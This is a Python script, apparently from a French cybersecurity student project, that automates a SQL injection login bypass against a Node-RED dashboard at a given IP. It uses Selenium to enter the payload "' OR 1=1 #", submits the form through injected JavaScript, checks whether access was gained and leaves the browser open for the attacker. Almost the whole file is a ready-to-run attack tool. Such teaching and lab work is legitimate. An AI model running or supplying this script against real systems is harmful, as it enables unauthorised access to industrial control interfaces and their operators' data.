###############################################################################
# Projet : Mallette de Test de Sécurité Industrielle
# Fichier : injection.py
# Auteur : Sylvain PALOP LAUZERAL 
# Version : 1.0
# Date : 2026
# Formation : BTS CIEL (Cybersécurité, Informatique, Électronique)
# Description : Module d'injection SQL/NoSQL pour bypass d'interface Node-RED.
###############################################################################

import sys
import os
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.by import By
import time

# Force l'affichage sur l'écran de la mallette
os.environ["DISPLAY"] = ":0.0"

def run_attack(target_ip):
    options = Options()


    url = f"http://{target_ip}:1880/ui"
    print(f"\n🚀 Lancement de l'attaque VISUELLE sur ton kit : {url}")
    
    try:
        driver = webdriver.Firefox(options=options)
        driver.maximize_window()
        
        driver.get(url)
        time.sleep(3) # Temps de chargement de l'interface Node-RED

        print("[*] Remplissage automatique des champs...")
        inputs = driver.find_elements(By.TAG_NAME, "input")
        
        if len(inputs) >= 2:
            inputs[0].clear()
            inputs[0].send_keys("' OR 1=1 #") 
            inputs[1].clear()
            inputs[1].send_keys(" ") 
            time.sleep(1) 

            print("[!] Recherche du bouton 'CONTINUER'...")
            driver.execute_script("""
                var buttons = document.querySelectorAll('button');
                var found = false;
                for (var i = 0; i < buttons.length; i++) {
                    if (buttons[i].innerText.includes('CONTINUER') || buttons[i].textContent.includes('CONTINUER')) {
                        buttons[i].click();
                        found = true;
                        break;
                    }
                }
                if (!found) {
                    if (buttons.length > 0) buttons[0].click();
                    else document.forms[0].submit();
                }
            """)
            
            print("🧨 Injection envoyée et formulaire soumis.")
            time.sleep(4) # Pause pour laisser l'interface charger
            
            # Vérification intelligente : si l'URL a changé ou si les inputs ont disparu
            if len(driver.find_elements(By.TAG_NAME, "input")) < 2:
                print(f"✅ SUCCÈS ! Bypass réussi.")
                print(f"📍 Accès libre sur : {driver.current_url}")
                # On ne ferme pas, on laisse le hacker naviguer
            else:
                print("❌ L'injection n'a pas déclenché de connexion automatique.")
                input("\nAppuie sur Entrée pour fermer la fenêtre...")

    except Exception as e:
        print(f"\n💥 Erreur : {e}")
    finally:
        # Correction de 'Print' en 'print'
        print("\n[!] Session maintenue. Fermez manuellement le navigateur pour quitter.")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        run_attack(sys.argv[1])
    else:
        target = input("[?] IP de la cible : ")
        run_attack(target)
